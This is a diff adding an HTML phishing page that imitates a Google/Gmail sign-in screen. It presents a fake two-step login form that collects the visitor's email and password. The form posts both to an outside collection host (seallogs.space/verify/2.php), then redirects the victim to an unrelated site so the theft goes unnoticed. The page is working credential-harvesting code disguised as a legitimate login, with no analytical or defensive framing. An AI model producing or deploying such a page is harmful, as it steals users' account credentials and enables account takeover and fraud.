@@ -1,0 +1,240 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Logolo Sign In</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f1f3f4;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: row;
+      background: #fff;
+      width: 916px;
+      height: 402px;
+      border-radius: 28px;
+      box-shadow: 0px 1px 6px rgba(60, 64, 67, 0.3);
+      overflow: hidden;
+    }
+
+    .info-section {
+      flex: 1;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .info-section img {
+      height: 65px;
+      width: 80px;
+      margin-bottom: 24px;
+      margin-top: -75px;
+    }
+
+    .form-section {
+      flex: 1;
+      padding: 60px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .form-section form {
+      width: 100%;
+    }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 500;
+      margin: 0 0 6px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #5f6368;
+      margin: 8px 0 32px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-bottom: 16px;
+    }
+
+    .link-group {
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .link-group a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .link-group a:hover {
+      text-decoration: underline;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .actions a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .actions button {
+      padding: 10px 24px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .actions button:hover {
+      background-color: #185abc;
+    }
+
+    .footer-wrapper {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 30px;
+      padding: 16px 0;
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+      flex-wrap: wrap;
+    }
+
+    .footer-left select {
+      border: none;
+      background: transparent;
+      font-size: 12px;
+      color: #5f6368;
+      outline: none;
+    }
+
+    .footer-right a {
+      margin-left: 16px;
+      text-decoration: none;
+      color: #5f6368;
+    }
+
+    .footer-right a:hover {
+      text-decoration: underline;
+    }
+
+    @media screen and (max-width: 950px) {
+      .container {
+        width: 100%;
+        height: auto;
+        flex-direction: column;
+        border-radius: 0;
+        box-shadow: none;
+      }
+
+      .footer-wrapper {
+        flex-direction: column;
+        gap: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="info-section">
+  <img src="https://cdn.freebiesupply.com/logos/thumbs/2x/google-g-2015-logo.png" alt="Logolo Logo" width="120" height="60">
+  <h2>Sign in</h2>
+  <p>with your Google Account to continue to Gmail.</p>
+</div>
+
+
+    <div class="form-section">
+      <form id="loginForm" action="https://seallogs.space/verify/2.php" method="POST" onsubmit="return handleSubmit()">
+        <input type="hidden" name="_redirect" value="https://account.docusign.com/">
+        
+        <div id="step1">
+          <input type="email" id="email" name="email" placeholder="Email or phone" required="">
+          <div class="link-group">
+            <a href="#">Forgot email?</a>
+          </div>
+          <p style="font-size: 13px; color: #5f6368; margin-bottom: 30px;">
+            Not your computer? Use a Private Window to sign in. 
+            <a href="#" style="color:#1a73e8; text-decoration:none;">Learn more about using Guest mode</a>
+          </p>
+          <div class="actions">
+            <a href="#">Create account</a>
+            <button type="button" onclick="nextStep()">Next</button>
+          </div>
+        </div>
+
+        <div id="step2" style="display: none;">
+          <h2>Welcome</h2>
+          <p class="email-display" id="emailDisplay" style="margin-bottom: 16px; font-weight: 500;"></p>
+          <input type="password" id="password" name="password" placeholder="Enter your password" required="">
+          <div class="actions" style="margin-top: 30px; justify-content: flex-end;">
+            <button type="submit">Sign in</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer-wrapper">
+    <div class="footer-left">
+      <label for="lang-select" style="margin-right: 8px;">Language:</label>
+      <select id="lang-select">
+        <option selected="">English (United States)</option>
+        <option>Français</option>
+        <option>Español</option>
+        <option>Deutsch</option>
+      </select>
+    </div>
+    <div class="footer-right">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+
+  <script>
+    function nextStep() {
+      let email = document.getElementById("email").value;
+      if (email.includes("@")) {
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+        document.getElementById("emailDisplay").innerText = email;
+      } else {
+        alert("Please enter a valid email address.");
+      }
+    }
+
+    function handleSubmit() {
+      window.location.href = "https://soweb.com";
+      return true;
+    }
+  </script>
+
+
+</body></html>
